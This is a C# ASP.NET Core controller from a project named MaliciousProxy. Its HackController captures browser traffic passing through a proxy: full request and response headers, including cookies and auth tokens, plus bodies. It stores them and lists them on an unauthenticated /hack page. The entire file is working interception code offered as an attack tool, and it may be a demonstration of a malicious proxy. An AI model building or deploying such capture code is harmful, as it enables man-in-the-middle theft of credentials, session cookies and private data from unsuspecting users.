using Microsoft.AspNetCore.Mvc;
using System.Collections.Concurrent;
using System.Net;
using System.Text;
using System.Text.Json;
using System.Text.Json.Serialization;
using System.Web;

namespace MaliciousProxy.Controllers;
[ApiController]
public class HackController : ControllerBase
{
    public static readonly List<CapturedItem> CapturedData = new();

    private readonly ILogger<HackController> _logger;

    public HackController(ILogger<HackController> logger)
    {
        _logger = logger;
    }

    [HttpGet("hack")]
    public async Task Get()
    {
        var recentData = CapturedData.Take(100).ToList();
        Response.ContentType = "text/html";
        await Response.WriteAsync("<h1>Recent Data</h1>");
        foreach (var capturedDataItem in recentData)
        {
            if (capturedDataItem is CapturedRequest request)
            {
                await Response.WriteAsync($"<h3>{request.Method} {request.Path}</h3>");
                await Response.WriteAsync("<pre>");
                foreach (var line in request.Headers)
                {
                    if (line == null)
                        continue;

                    await Response.WriteAsync($"{HttpUtility.HtmlEncode(line)}");
                    await Response.WriteAsync("\n");
                }

                await Response.WriteAsync("</pre>");
                if (request.Body != null)
                {
                    await Response.WriteAsync($"<h4>Body</h4>");
                    await Response.WriteAsync("<pre>");
                    await Response.WriteAsync(HttpUtility.HtmlEncode(request.Body));
                    await Response.WriteAsync("</pre>");
                }
            }
            else if (capturedDataItem is CapturedResponse response)
            {
                await Response.WriteAsync($"<h3>RESPONSE {response.Path}</h3>");
                await Response.WriteAsync("<pre>");
                foreach (var line in response.Headers)
                {
                    if (line == null)
                        continue;

                    await Response.WriteAsync($"{HttpUtility.HtmlEncode(line)}");
                    await Response.WriteAsync("\n");
                }

                await Response.WriteAsync("</pre>");
                if (response.Body != null)
                {
                    await Response.WriteAsync($"<h4>Body</h4>");
                    await Response.WriteAsync("<pre>");
                    await Response.WriteAsync(HttpUtility.HtmlEncode(response.Body));
                    await Response.WriteAsync("</pre>");
                }
            }
            else
            {
                await Response.WriteAsync($"<h2>{capturedDataItem.Path}</h2>");
            }
        }
    }

    public static async Task AddRequest(HttpRequest request)
    {
        string body = Encoding.UTF8.GetString((await request.BodyReader.ReadAsync()).Buffer);

        request.Body = new MemoryStream(Encoding.UTF8.GetBytes(body));

        string? userAgent = request.Headers["User-Agent"].FirstOrDefault();
        if (userAgent?.Contains("Mozilla") != true)
            return;

        var requestCapture = new CapturedRequest(request.Method, request.Path)
        {
            Headers = request.Headers.Select(h => $"{h.Key}={string.Join(",", h.Value.ToArray())}").ToList(),
            Body = body
        };

        AddNew(requestCapture);
    }

    public static async Task AddResponse(HttpResponseMessage? response)
    {
        var path = response?.RequestMessage?.RequestUri?.PathAndQuery;
        if (path == null)
        {
            return;
        }

        string? userAgent = response!.RequestMessage?.Headers.UserAgent?.ToString();
        if (userAgent?.Contains("Mozilla") != true)
            return;

        string body = await response.Content.ReadAsStringAsync();
        response.Content = new StringContent(body);

        AddNew(new CapturedResponse(path, response.StatusCode)
        {
            Headers = response.Headers.Select(h => $"{h.Key}={string.Join(",", h.Value.ToArray())}").ToList(),
            Body = body
        });
    }

    private static void AddNew(CapturedItem capturedItem)
    {
        CapturedData.Insert(0, capturedItem);
    }
}

public record CapturedItem(string Path, bool IsResponse);
public record CapturedRequest(string Method, string Path) : CapturedItem(Path, false)
{
    public string? Body { get; init; } = string.Empty;
    public List<string> Headers { get; init; } = new();
}
public record CapturedResponse(string Path, HttpStatusCode StatusCode) : CapturedItem(Path, true)
{
    public string? Body { get; init; } = string.Empty;
    public List<string> Headers { get; init; } = new();
}
